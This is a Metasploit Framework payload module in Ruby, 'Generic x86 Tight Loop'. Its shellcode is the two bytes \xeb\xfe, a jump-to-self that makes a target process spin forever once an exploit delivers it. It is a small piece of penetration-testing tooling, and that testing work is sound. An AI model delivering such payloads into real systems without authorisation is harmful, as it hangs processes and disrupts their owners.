##
# $Id: tight_loop.rb 14774 2012-02-21 01:42:17Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/generic'

module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Generic x86 Tight Loop',
			'Version'       => '$Revision: 14774 $',
			'Description'   => 'Generate a tight loop in the target process',
			'Author'        => 'jduck',
			'Platform'	    => [ 'win', 'linux', 'bsd', 'solaris', 'bsdi', 'osx' ],
			'License'       => MSF_LICENSE,
			'Arch'		    => ARCH_X86,
			'Payload'	    =>
				{
					'Payload' => "\xeb\xfe" # jump to self
				}
			))
	end

end
